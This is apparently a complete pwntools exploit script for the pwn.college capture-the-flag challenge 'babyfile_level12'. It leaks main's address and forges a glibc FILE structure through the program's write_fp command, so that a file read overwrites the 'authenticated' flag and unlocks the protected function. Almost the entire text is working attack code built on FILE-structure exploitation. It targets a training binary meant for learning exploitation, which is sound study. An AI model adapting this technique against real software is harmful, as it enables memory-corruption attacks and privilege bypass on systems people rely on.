from pwn import *
from time import sleep
context.binary=e=ELF("./babyfile_level12")
libc=e.libc
gs="""
set listsize 50
set $glibc_src_dir="../../glibc-2.31/"
source ~/add_src.py
b fread  if ( $rdi != stdin )
b _IO_file_xsgetn if ( $rdi != stdin)
b _IO_new_file_underflow if ( $rdi != stdin)
b win
"""
_IO_EOF_SEEN=0x0010
_IO_NO_READS=0x0004
_IO_CURRENTLY_PUTTING=0x0800
_IO_IS_APPENDING=0x1000
_IO_IN_BACKUP=0x0100
_IO_FLAGS2_NOTCANCEL=2
_IO_MAGIC=0xFBAD0000 
_IO_MAGIC_MASK=0xFFFF0000
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfile_level12")
p.recvuntil(b"[LEAK] main is located at: 0x")
e.address=int(p.recvuntil(b"\n").rstrip().decode(),16)-e.sym.main
p.sendlineafter(b"[*] Commands: ",b"new_note")
p.sendlineafter(b"Which note? (0-10)",b"0")
p.sendlineafter(b"How many bytes to the note?\n>",b"2")
p.sendlineafter(b"[*] Commands: ",b"open_file")
p.sendlineafter(b"[*] Commands: ",b"write_fp")
p.sendafter(b" {0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0}\n",
            p64(0)+ #_flags
            p64(e.sym.authenticated)+p64(e.sym.authenticated+1)+p64(0)+ # read_ptr,read_end,read_base
            p64(0)+p64(0)+p64(0)+ # write_base,write_ptr,write_end
            p64(e.sym.authenticated)+p64(e.sym.authenticated+8)+p64(0)+ # buf_base,buf_end,save_base
            b"\0"*(112-8-8*3*3)+p32(0)+p32(0)+ # fileno, flags2
            b"\0"*(136-112-8)+p64(e.sym.authenticated+8)+ # _lock
            b"\0"*(160-136-8)+p64(0)+ # _wide_data
            b"\0"*(216-160-8)
            )
p.sendlineafter(b"[*] Commands: ",b"read_file")
p.sendlineafter(b"Which note? (0-10)",b"0")
p.sendline(b"AAA")
p.sendlineafter(b"[*] Commands: ",b"authenticate")
p.interactive()